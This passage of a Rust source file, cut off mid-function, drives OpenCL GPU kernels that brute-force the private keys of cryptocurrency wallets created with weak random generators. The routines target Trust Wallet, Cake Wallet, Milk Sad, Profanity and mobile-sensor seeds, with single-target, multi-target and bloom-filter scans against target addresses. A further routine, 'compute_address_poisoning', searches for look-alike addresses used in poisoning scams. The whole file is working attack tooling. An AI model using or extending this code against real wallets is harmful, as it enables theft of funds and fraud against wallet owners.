use ocl::{Buffer, MemFlags, Program, ProQue, Queue};
use tracing::{error, info};
use std::path::PathBuf;

use super::gpu_buffers::GpuConstBuffers;

const VECTOR_WIDTH_TO_WARP_MULTIPLIER: usize = 8;

#[derive(Debug, Clone, Copy)]
pub enum KernelProfile {
    Full,
    Minimal,
    MobileSensor,
    CakeWalletHash,
    CakeWalletFull,
    #[deprecated(note = "Use CakeWalletHash and CakeWalletFull separately instead")]
    CakeWallet,
}

impl KernelProfile {
    fn get_files(&self) -> Vec<&'static str> {
        match self {
            KernelProfile::Minimal => vec!["common", "ripemd", "sha2", "sha512"],
            KernelProfile::MobileSensor => vec![
                "common",
                "sha2",
                "mobile_sensor_hash",
                "mobile_sensor_crack",
            ],
            KernelProfile::CakeWalletHash => vec![
                "common",
                "sha2",
                "mnemonic_constants",
                "dart_prng",
                "bip39_helpers",
                "bip39_wordlist_complete",
                "cake_hash",
            ],
            KernelProfile::CakeWalletFull => vec![
                "common",
                "ripemd",
                "sha2",
                "sha512",
                "secp256k1_common",
                "secp256k1_scalar",
                "secp256k1_field",
                "secp256k1_group",
                "secp256k1_prec",
                "secp256k1",
                "address",
                "mnemonic_constants",
                "dart_prng",
                "bip39_helpers",
                "bip39_wordlist_complete",
                "batch_cake_full",
            ],
            #[allow(deprecated)]
            KernelProfile::CakeWallet => vec![
                "common",
                "ripemd",
                "sha2",
                "sha512",
                "secp256k1_common",
                "secp256k1_scalar",
                "secp256k1_field",
                "secp256k1_group",
                "secp256k1_prec",
                "secp256k1",
                "address",
                "mnemonic_constants",
                "dart_prng",
                "bip39_helpers",
                "bip39_wordlist_complete",
                "cake_hash",
                "batch_cake_full",
				"cake_wallet_crack",
            ],
            KernelProfile::Full => vec![
                "common",
                "ripemd",
                "sha2",
                "secp256k1_common",
                "secp256k1_scalar",
                "secp256k1_field",
                "secp256k1_group",
                "secp256k1_prec",
                "secp256k1",
                "address",
                "mnemonic_constants",
                "mt19937",
                "dart_prng",
                "bip39_helpers",
                "bip39_wordlist_complete",
                "bip39_full",
                "batch_address",
                "batch_address_electrum",
                "cake_hash",
                "batch_cake_full",
                "mobile_sensor_hash",
                "base58",
                "address_poisoning",
                "mobile_sensor_crack",
                "keccak256",
                "mt19937_64",
                "batch_profanity",
                "trust_wallet_crack",
                "trust_wallet_lcg_crack",        // single-target
                "trust_wallet_lcg_crack_mt",     // multi-target (N addresses, one pass)
                "trust_wallet_lcg_crack_bloom",  // bloom filter
				"cake_wallet_crack",
                "milk_sad_crack",
                "test_mt19937",
                "milk_sad_crack_multi30",
                "milk_sad_crack_multi_target",
            ],
        }
    }
}

pub struct GpuSolver {
    pub queue: Queue,
    pub program: Program,
    pub consts: GpuConstBuffers,

    pro_que: ProQue,
    kernel_name: String,

    max_work_group_size: usize,
    preferred_work_group_multiple: usize,
    max_compute_units: u32,
    local_mem_size: u64,
    profile: KernelProfile,
}

impl GpuSolver {
	pub fn compute_keccak256(
    &self,
    messages: &[Vec<u8>],
) -> ocl::Result<Vec<[u8;32]>> {

    let count = messages.len();
    if count == 0 {
        return Ok(Vec::new());
    }

    let stride = 136;
    let msg_len = messages[0].len() as u32;

    let mut flat = vec![0u8; count * stride];

    for (i, msg) in messages.iter().enumerate() {
        flat[i*stride..i*stride+msg.len()]
            .copy_from_slice(msg);
    }

    let buffer_in = Buffer::<u8>::builder()
        .queue(self.pro_que.queue().clone())
        .flags(MemFlags::new().read_only().copy_host_ptr())
        .len(flat.len())
        .copy_host_slice(&flat)
        .build()?;

    let buffer_out = Buffer::<u8>::builder()
        .queue(self.pro_que.queue().clone())
        .flags(MemFlags::new().write_only())
        .len(count * 32)
        .build()?;

    let local = self.calculate_local_work_size(count);
    let global = count.div_ceil(local) * local;

    let kernel = self.pro_que
        .kernel_builder("keccak256_batch")
        .arg(&buffer_in)
        .arg(stride as u32)
        .arg(msg_len)
        .arg(&buffer_out)
        .arg(count as u32)
        .global_work_size(global)
        .local_work_size(local)
        .build()?;

    unsafe { kernel.enq()?; }

    let mut raw = vec![0u8; count*32];
    buffer_out.read(&mut raw).enq()?;

    let mut out = Vec::with_capacity(count);
    for chunk in raw.chunks(32) {
        let mut h = [0u8;32];
        h.copy_from_slice(chunk);
        out.push(h);
    }

    Ok(out)
}
	
    /// Default constructor
    pub fn new() -> ocl::Result<Self> {
        Self::new_with_profile(KernelProfile::Full)
    }

    pub fn new_with_profile(profile: KernelProfile) -> ocl::Result<Self> {
        info!("[GPU] Initializing with profile {:?}", profile);
		let files = profile.get_files();
		let mut source = String::new();

		for f in files {
			let kernel_path = PathBuf::from(env!("CARGO_MANIFEST_DIR"))
				.join("cl")
				.join(format!("{}.cl", f));
				
			info!("[GPU] Loading kernel: {}", kernel_path.display());

			let src = std::fs::read_to_string(&kernel_path)
				.map_err(|e| {
					error!("Failed to read OpenCL kernel: {}", kernel_path.display());
					e
				})?;
			
			source.push_str(&src);
			source.push('\n');
		}
		
		if source.is_empty() {
			panic!("OpenCL kernel source is EMPTY");
		}
        let pro_que = ProQue::builder()
            .src(source)
			.dims(1)
            .build()?;
			
		{
			use ocl::enums::{ProgramBuildInfo, ProgramBuildInfoResult};
			let device = pro_que.device();
			match pro_que.program().build_info(device, ProgramBuildInfo::BuildLog) {
				Ok(ProgramBuildInfoResult::BuildLog(log)) if !log.trim().is_empty() => {
					eprintln!("=== OpenCL BUILD LOG ===\n{}\n========================", log);
				}
				_ => {}
			}
		}

        let device = pro_que.device();
        let queue = pro_que.queue().clone();
        let _context = pro_que.context().clone();
		let program = pro_que.program().clone();

        let consts = GpuConstBuffers::new(&queue)?;

        use ocl::enums::{DeviceInfo, DeviceInfoResult};

		let max_work_group_size = match device.info(DeviceInfo::MaxWorkGroupSize)? {
			DeviceInfoResult::MaxWorkGroupSize(v) => v as usize,
			_ => 256,
		};

		let max_compute_units = match device.info(DeviceInfo::MaxComputeUnits)? {
			DeviceInfoResult::MaxComputeUnits(v) => v,
			_ => 1,
		};

		let local_mem_size = match device.info(DeviceInfo::LocalMemSize)? {
			DeviceInfoResult::LocalMemSize(v) => v,
			_ => 32 * 1024,
};

		let preferred_work_group_multiple =
			match device.info(DeviceInfo::PreferredVectorWidthInt)? {
				DeviceInfoResult::PreferredVectorWidthInt(v) if v > 0 =>
					(v as usize) * VECTOR_WIDTH_TO_WARP_MULTIPLIER,
				_ => 32,
			};

        Ok(Self {
            queue,
            program,
            consts,
            pro_que,
            kernel_name: "batch_address".to_string(),
            max_work_group_size,
            preferred_work_group_multiple,
            max_compute_units,
            local_mem_size,
            profile,
        })
    }

	fn calculate_local_work_size(&self, global_size: usize) -> usize {
		if global_size == 0 {
			return 1;
    }

    let target = self.preferred_work_group_multiple.max(64);

    if global_size <= target {
        return target.min(self.max_work_group_size);
    }

    let max_aligned =
        (self.max_work_group_size / target) * target;

    max_aligned
        .max(target)
        .min(self.max_work_group_size)
}

    #[allow(dead_code)]
    fn calculate_optimal_batch_size(&self, _work_per_item: usize) -> usize {
        let occupancy_factor = 4;
        let optimal_size =
            (self.max_compute_units as usize) * self.max_work_group_size * occupancy_factor;
        let rounded = optimal_size.div_ceil(self.preferred_work_group_multiple)
            * self.preferred_work_group_multiple;
        rounded.max(self.preferred_work_group_multiple)
    }

    pub fn compute_batch(
        &self,
        entropies: &[[u8; 16]],
        purpose: u32,
    ) -> ocl::Result<Vec<[u8; 25]>> {
        self.compute_batch_with_kernel(&self.kernel_name, entropies, purpose)
    }

    pub fn compute_batch_electrum(
        &self,
        entropies: &[[u8; 16]],
        purpose: u32,
    ) -> ocl::Result<Vec<[u8; 25]>> {
        self.compute_batch_with_kernel("batch_address_electrum", entropies, purpose)
    }

    pub fn compute_batch_optimized(
        &self,
        entropies: &[[u8; 16]],
        purpose: u32,
    ) -> ocl::Result<Vec<[u8; 25]>> {
        self.compute_batch(entropies, purpose)
    }

    fn compute_batch_with_kernel(
        &self,
        kernel_name: &str,
        entropies: &[[u8; 16]],
        purpose: u32,
    ) -> ocl::Result<Vec<[u8; 25]>> {
        let batch_size = entropies.len();
        if batch_size == 0 {
            return Ok(Vec::new());
        }

        let mut entropies_hi = Vec::with_capacity(batch_size);
        let mut entropies_lo = Vec::with_capacity(batch_size);

        for ent in entropies {
            let hi = u64::from_be_bytes(ent[0..8].try_into().expect("16 bytes"));
            let lo = u64::from_be_bytes(ent[8..16].try_into().expect("16 bytes"));
            entropies_hi.push(hi);
            entropies_lo.push(lo);
        }

        let buffer_hi = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(batch_size)
            .copy_host_slice(&entropies_hi)
            .build()?;

        let buffer_lo = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(batch_size)
            .copy_host_slice(&entropies_lo)
            .build()?;

        let output_len = batch_size * 25;
        let buffer_out = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(output_len)
            .build()?;

        let local_work_size = self.calculate_local_work_size(batch_size);
        let global_work_size = batch_size.div_ceil(local_work_size) * local_work_size;

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_hi)
            .arg(&buffer_lo)
            .arg(&buffer_out)
            .arg(purpose)
            .arg(batch_size as u32)
            .global_work_size(global_work_size)
            .local_work_size(local_work_size)
            .build()?;

        unsafe { kernel.enq()?; }

        let mut output = vec![0u8; output_len];
        buffer_out.read(&mut output).enq()?;

        let mut results = Vec::with_capacity(batch_size);
        for chunk in output.chunks(25) {
            let mut addr = [0u8; 25];
            addr.copy_from_slice(chunk);
            results.push(addr);
        }
        Ok(results)
    }

    pub fn compute_cake_hash(
        &self,
        timestamps: &[u64],
        target_hashes: &[u8],
    ) -> ocl::Result<Vec<u64>> {
        let batch_size = timestamps.len();
        let target_count = target_hashes.len() / 32;

        let buffer_timestamps = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(batch_size)
            .copy_host_slice(timestamps)
            .build()?;

        let buffer_hashes = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(target_hashes.len())
            .copy_host_slice(target_hashes)
            .build()?;

        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr().copy_host_ptr())
            .len(1)
            .copy_host_slice(&[0u32])
            .build()?;

        let local_work_size = self.calculate_local_work_size(batch_size);

        let kernel = self
			.pro_que
			.kernel_builder("cake_hash")
			.arg(&buffer_timestamps)
			.arg(&buffer_hashes)
			.arg(target_count as u32)
			.arg(&buffer_results)
			.arg(&buffer_count)
			.arg_local::<u64>(24)
			.global_work_size(batch_size)
			.local_work_size(local_work_size)
			.build()?;

        unsafe { kernel.enq()?; }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = count.min(max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }

    pub fn compute_mobile_hash(&self, indices: &[u64]) -> ocl::Result<Vec<[u8; 32]>> {
        let count = indices.len();
        if count == 0 { return Ok(Vec::new()); }

        let buffer_indices = Buffer::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(count)
            .copy_host_slice(indices)
            .build()?;

        let out_len = count * 32;
        let buffer_out = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(out_len)
            .build()?;

        let local_work_size = self.calculate_local_work_size(count);

        let kernel = self
            .pro_que
            .kernel_builder("mobile_sensor_hash")
            .arg(&buffer_indices)
            .arg(&buffer_out)
            .arg(count as u32)
            .global_work_size(count)
            .local_work_size(local_work_size)
            .build()?;

        unsafe { kernel.enq()?; }

        let mut raw = vec![0u8; out_len];
        buffer_out.read(&mut raw).enq()?;

        let mut hashes: Vec<[u8; 32]> = Vec::with_capacity(count);
        for chunk in raw.chunks(32) {
            let mut arr = [0u8; 32];
            arr.copy_from_slice(chunk);
            hashes.push(arr);
        }
        Ok(hashes)
    }

    pub fn compute_address_poisoning(
        &self,
        seed_base: u64,
        batch_size: usize,
        target_prefix: &str,
        target_suffix: &str,
    ) -> ocl::Result<Vec<u64>> {
        let mut prefix_encoded = 0u64;
        for (i, b) in target_prefix.bytes().enumerate().take(8) {
            prefix_encoded |= (b as u64) << (i * 8);
        }
        let mut suffix_encoded = 0u64;
        for (i, b) in target_suffix.bytes().enumerate().take(8) {
            suffix_encoded |= (b as u64) << (i * 8);
        }

        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().copy_host_ptr())
            .len(1)
            .copy_host_slice(&[0u32])
            .build()?;

        let kernel = self
            .pro_que
            .kernel_builder("address_poisoning")
            .arg(seed_base)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(target_prefix.len() as u32)
            .arg(target_suffix.len() as u32)
            .arg(prefix_encoded)
            .arg(suffix_encoded)
            .global_work_size(batch_size)
            .build()?;

        unsafe { kernel.enq()?; }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = count.min(max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }

    pub fn compute_mobile_crack(&self, target_h160: &[u8; 20]) -> ocl::Result<Vec<u64>> {
        let mut h1 = 0u64;
        let mut h2 = 0u64;
        let mut h3 = 0u32;
        for (i, &byte) in target_h160.iter().enumerate().take(8)       { h1 |= (byte as u64) << (i * 8); }
        for (i, &byte) in target_h160.iter().skip(8).enumerate().take(8)  { h2 |= (byte as u64) << (i * 8); }
        for (i, &byte) in target_h160.iter().skip(16).enumerate().take(4) { h3 |= (byte as u32) << (i * 8); }

        let max_results = 1024;
        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(max_results)
            .build()?;

        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr().copy_host_ptr())
            .len(1)
            .copy_host_slice(&[0u32])
            .build()?;

        let range: usize = 201 * 201 * 201;
        let local_work_size = self.max_work_group_size.min(256);
        let global_work_size = range.div_ceil(local_work_size) * local_work_size;

        let kernel = self
            .pro_que
            .kernel_builder("mobile_sensor_crack")
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(h1)
            .arg(h2)
            .arg(h3)
            .arg(0u64)
            .global_work_size(global_work_size)
            .local_work_size(local_work_size)
            .build()?;

        unsafe { kernel.enq()?; }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = count_vec[0] as usize;

        if count > 0 {
            let read_count = count.min(max_results);
            let mut results = vec![0u64; max_results];
            buffer_results.read(&mut results).enq()?;
            Ok(results[0..read_count].to_vec())
        } else {
            Ok(Vec::new())
        }
    }

    pub fn compute_profanity(
        &self,
        total_seeds: u64,
        target_addr: &[u8],
    ) -> ocl::Result<Vec<u64>> {
        let kernel_name = "batch_profanity";
        if target_addr.len() != 20 {
            return Err(ocl::Error::from(format!("Invalid address length: {}", target_addr.len())));
        }
        let max_profanity_seed = 4_294_967_296u64;
        let actual_total = total_seeds.min(max_profanity_seed);
        let batch_size = 100_000_000u64;
        let max_results = 1024;

        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_results)
            .build()?;
        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;

        let mut target_part1: u64 = 0;
        let mut target_part2: u64 = 0;
        let mut target_part3: u32 = 0;
        for i in 0..8 { target_part1 |= (target_addr[i]      as u64) << (i * 8); }
        for i in 0..8 { target_part2 |= (target_addr[8 + i]  as u64) << (i * 8); }
        for i in 0..4 { target_part3 |= (target_addr[16 + i] as u32) << (i * 8); }

        info!("[GPU] Target packed: {:016x} {:016x} {:08x}", target_part1, target_part2, target_part3);

        let mut all_results = Vec::new();
        let mut batch_start = 0u64;
        while batch_start < actual_total {
            let batch_end   = (batch_start + batch_size).min(actual_total);
            let batch_count = (batch_end - batch_start) as usize;
            buffer_count.write(&vec![0u32]).enq()?;

            let kernel = self
                .pro_que
                .kernel_builder(kernel_name)
                .arg(&buffer_results)
                .arg(&buffer_count)
                .arg(target_part1)
                .arg(target_part2)
                .arg(target_part3)
                .arg(batch_start)
                .build()?;

            let local_work_size  = 128;
            let global_work_size = batch_count.div_ceil(local_work_size) * local_work_size;
            info!("[GPU] Batch: {}-{} ({} seeds)", batch_start, batch_end, batch_count);

            unsafe {
                kernel.cmd().global_work_size(global_work_size).local_work_size(local_work_size).enq()?;
            }

            let mut count_vec = vec![0u32; 1];
            buffer_count.read(&mut count_vec).enq()?;
            let count = count_vec[0] as usize;
            if count > 0 {
                let read_count = count.min(max_results);
                let mut results = vec![0u64; max_results];
                buffer_results.read(&mut results).enq()?;
                for &seed in results.iter().take(read_count) { all_results.push(seed); }
            }
            batch_start = batch_end;
        }
        Ok(all_results)
    }

    /// Trust Wallet Browser Extension — MT19937 / LSB crack
    pub fn compute_trust_wallet_crack(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        target_h160: &[u8; 20],
    ) -> ocl::Result<Vec<u64>> {
        let kernel_name = "trust_wallet_crack";
        const MAX_RESULTS: usize = 1024;

        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(MAX_RESULTS)
            .build()?;
        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;
        buffer_count.write(&vec![0u32]).enq()?;

        let mut h1: u64 = 0;
        let mut h2: u64 = 0;
        let mut h3: u32 = 0;
        for (i, &b) in target_h160.iter().enumerate().take(8)       { h1 |= (b as u64) << (i * 8); }
        for (i, &b) in target_h160.iter().skip(8).enumerate().take(8)  { h2 |= (b as u64) << (i * 8); }
        for (i, &b) in target_h160.iter().skip(16).enumerate().take(4) { h3 |= (b as u32) << (i * 8); }

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results)
            .arg(&buffer_count)
            .arg(h1).arg(h2).arg(h3)
            .arg(start_timestamp)
            .build()?;

        let range = (end_timestamp - start_timestamp) as usize;
        let local  = self.max_work_group_size.min(256);
        let global = range.div_ceil(local) * local;

        unsafe {
            if let Err(e) = kernel.cmd().global_work_size(global).local_work_size(local).enq() {
                error!("Kernel failed: {} ({})", e, kernel_name);
                return Err(e);
            }
        }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = (count_vec[0] as usize).min(MAX_RESULTS);
        if count == 0 { return Ok(Vec::new()); }

        let mut results = vec![0u64; MAX_RESULTS];
        buffer_results.read(&mut results).enq()?;
        Ok(results[0..count].to_vec())
    }

    /// Trust Wallet iOS — minstd_rand0 (LCG) single-target crack
    pub fn compute_trust_wallet_lcg_crack(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        target_h160: &[u8; 20],
    ) -> ocl::Result<Vec<(u32, u32)>> {
        let kernel_name = "trust_wallet_lcg_crack";
        const MAX_RESULTS: usize = 1024;

        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(MAX_RESULTS)
            .build()?;
        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;
        buffer_count.write(&vec![0u32]).enq()?;

        let mut h1: u64 = 0; let mut h2: u64 = 0; let mut h3: u32 = 0;
        for (i, &b) in target_h160.iter().enumerate().take(8)       { h1 |= (b as u64) << (i * 8); }
        for (i, &b) in target_h160.iter().skip(8).enumerate().take(8)  { h2 |= (b as u64) << (i * 8); }
        for (i, &b) in target_h160.iter().skip(16).enumerate().take(4) { h3 |= (b as u32) << (i * 8); }

        let range  = (end_timestamp - start_timestamp) as usize;
        let local  = self.max_work_group_size.min(256);
        let global = (range * 6).div_ceil(local) * local;

        info!("[GPU:LCG] {} ts × 6 combos → {} work items (local={})", range, range*6, local);

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results).arg(&buffer_count)
            .arg(h1).arg(h2).arg(h3)
            .arg(start_timestamp)
            .arg(range as u32)
            .global_work_size(global).local_work_size(local)
            .build()?;

        unsafe {
            if let Err(e) = kernel.cmd().global_work_size(global).local_work_size(local).enq() {
                error!("[GPU:LCG] Kernel failed: {}", e);
                return Err(e);
            }
        }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = (count_vec[0] as usize).min(MAX_RESULTS);
        if count == 0 { return Ok(Vec::new()); }

        let mut raw = vec![0u64; MAX_RESULTS];
        buffer_results.read(&mut raw).enq()?;
        Ok(raw[..count].iter().map(|&v| ((v & 0xFFFF_FFFF) as u32, (v >> 32) as u32)).collect())
    }

    /// Trust Wallet iOS — minstd_rand0 (LCG) MULTI-TARGET crack
    ///
    /// Scans all N hash160 targets in a single GPU pass.
    /// Returns Vec<(timestamp, combo, target_idx)>.
    pub fn compute_trust_wallet_lcg_crack_mt(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        hash160s: &[[u8; 20]],
    ) -> ocl::Result<Vec<(u32, u32, u32)>> {
        let kernel_name = "trust_wallet_lcg_crack_mt";
        let target_count = hash160s.len();
        if target_count == 0 { return Ok(Vec::new()); }

        // Flatten N×20 bytes
        let mut flat = vec![0u8; target_count * 20];
        for (i, h) in hash160s.iter().enumerate() {
            flat[i * 20..(i + 1) * 20].copy_from_slice(h);
        }

        const MAX_RESULTS: usize = 8192;

        let buf_targets = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(flat.len())
            .copy_host_slice(&flat)
            .build()?;

        let buf_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(MAX_RESULTS * 2)
            .build()?;

        let buf_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;
        buf_count.write(&vec![0u32]).enq()?;

        let range  = (end_timestamp - start_timestamp) as usize;
        let local  = self.max_work_group_size.min(256);
        let global = (range * 6).div_ceil(local) * local;

        info!(
            "[GPU:LCG-MT] {} ts × 6 combos × {} targets → {} work items (local={})",
            range, target_count, range * 6, local
        );

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buf_results)
            .arg(&buf_count)
            .arg(&buf_targets)
            .arg(target_count as u32)
            .arg(start_timestamp)
            .arg(range as u32)
            .arg(MAX_RESULTS as u32)
            .global_work_size(global)
            .local_work_size(local)
            .build()?;

        unsafe {
            if let Err(e) = kernel.cmd().global_work_size(global).local_work_size(local).enq() {
                error!("[GPU:LCG-MT] Kernel failed: {}", e);
                return Err(e);
            }
        }

        let mut count_vec = vec![0u32; 1];
        buf_count.read(&mut count_vec).enq()?;
        let count = (count_vec[0] as usize).min(MAX_RESULTS);
        if count == 0 { return Ok(Vec::new()); }

        let mut raw = vec![0u64; MAX_RESULTS * 2];
        buf_results.read(&mut raw).enq()?;

        let output = (0..count).map(|i| {
            let w0 = raw[i * 2];
            let w1 = raw[i * 2 + 1];
            let timestamp  = (w0 & 0xFFFF_FFFF) as u32;
            let combo      = (w0 >> 32) as u32;
            let target_idx = w1 as u32;
            (timestamp, combo, target_idx)
        }).collect();

        Ok(output)
    }

    /// Trust Wallet iOS — bloom filter scan
    pub fn compute_trust_wallet_lcg_bloom(
        &self,
        start_timestamp: u32,
        end_timestamp: u32,
        bloom_data: &[u8],
    ) -> ocl::Result<Vec<(u32, u32)>> {
        let kernel_name = "trust_wallet_lcg_bloom";
        const MAX_RESULTS: usize = 4096;

        info!("[GPU:BLOOM] Uploading bloom filter ({} MB)…", bloom_data.len() / 1_048_576);
        let bloom_buf = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
            .len(bloom_data.len())
            .copy_host_slice(bloom_data)
            .build()?;

        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(MAX_RESULTS)
            .build()?;
        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;
        buffer_count.write(&vec![0u32]).enq()?;

        let range  = (end_timestamp - start_timestamp) as usize;
        let local  = self.max_work_group_size.min(256);
        let global = (range * 6).div_ceil(local) * local;

        info!("[GPU:BLOOM] {} ts × 6 → {} work items (local={})", range, range*6, local);

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results).arg(&buffer_count)
            .arg(&bloom_buf)
            .arg(start_timestamp)
            .arg(range as u32)
            .global_work_size(global).local_work_size(local)
            .build()?;

        unsafe {
            if let Err(e) = kernel.cmd().global_work_size(global).local_work_size(local).enq() {
                error!("[GPU:BLOOM] Kernel failed: {}", e);
                return Err(e);
            }
        }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let count = (count_vec[0] as usize).min(MAX_RESULTS);
        if count == 0 { return Ok(Vec::new()); }

        let mut raw = vec![0u64; MAX_RESULTS];
        buffer_results.read(&mut raw).enq()?;
        Ok(raw[..count].iter().map(|&v| ((v & 0xFFFF_FFFF) as u32, (v >> 32) as u32)).collect())
    }

    pub fn compute_cake_wallet_crack_ms(
        &self,
        start_ms: u64,
        count: u32,
        target_h160: &[u8; 20],
    ) -> ocl::Result<Vec<(u64, u32, u32)>> {
        let kernel_name = "cake_wallet_crack_ms";
        let max_hits = 1024usize;

        let buffer_results = Buffer::<u64>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(max_hits * 3)
            .build()?;
        let buffer_count = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_write().alloc_host_ptr())
            .len(1)
            .build()?;
        buffer_count.write(&vec![0u32]).enq()?;

        let mut h1 = 0u64; let mut h2 = 0u64; let mut h3 = 0u32;
        for i in 0..8 { h1 |= (target_h160[i]      as u64) << (i * 8); }
        for i in 0..8 { h2 |= (target_h160[i + 8]  as u64) << (i * 8); }
        for i in 0..4 { h3 |= (target_h160[i + 16] as u32) << (i * 8); }

        let local_work_size  = 128usize;
        let global_work_size = (count as usize).div_ceil(local_work_size) * local_work_size;

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_results).arg(&buffer_count)
            .arg(h1).arg(h2).arg(h3)
            .arg(start_ms)
            .global_work_size(global_work_size).local_work_size(local_work_size)
            .build()?;
        unsafe { kernel.enq()?; }

        let mut count_vec = vec![0u32; 1];
        buffer_count.read(&mut count_vec).enq()?;
        let hit_count = (count_vec[0] as usize).min(max_hits);
        if hit_count == 0 { return Ok(Vec::new()); }

        let mut raw = vec![0u64; max_hits * 3];
        buffer_results.read(&mut raw).enq()?;

        let mut out = Vec::with_capacity(hit_count);
        for i in 0..hit_count {
            out.push((raw[i*3], raw[i*3+1] as u32, raw[i*3+2] as u32));
        }
        Ok(out)
    }

    pub fn compute_cake_batch_full(&self, seed_indices: &[u32]) -> ocl::Result<Vec<[u8; 33]>> {
        let kernel_name = "batch_cake_full";
        let batch_size = seed_indices.len();
        if batch_size == 0 { return Ok(Vec::new()); }

        let buffer_seeds = Buffer::<u32>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().read_only().copy_host_ptr())
            .len(batch_size)
            .copy_host_slice(seed_indices)
            .build()?;

        let total_output_bytes = batch_size * 40 * 33;
        let buffer_results = Buffer::<u8>::builder()
            .queue(self.pro_que.queue().clone())
            .flags(MemFlags::new().write_only().alloc_host_ptr())
            .len(total_output_bytes)
            .build()?;

        let kernel = self
            .pro_que
            .kernel_builder(kernel_name)
            .arg(&buffer_seeds).arg(&buffer_results)
            .arg(batch_size as u32)
            .global_work_size(batch_size)
            .build()?;
        unsafe { kernel.enq()?; }

        let mut results_bytes = vec![0u8; total_output_bytes];
        buffer_results.read(&mut results_bytes).enq()?;

        let mut keys = Vec::with_capacity(batch_size * 40);
        for chunk in results_bytes.chunks_exact(33) {
            let mut k = [0u8; 33];
            k.copy_from_slice(chunk);
            keys.push(k);
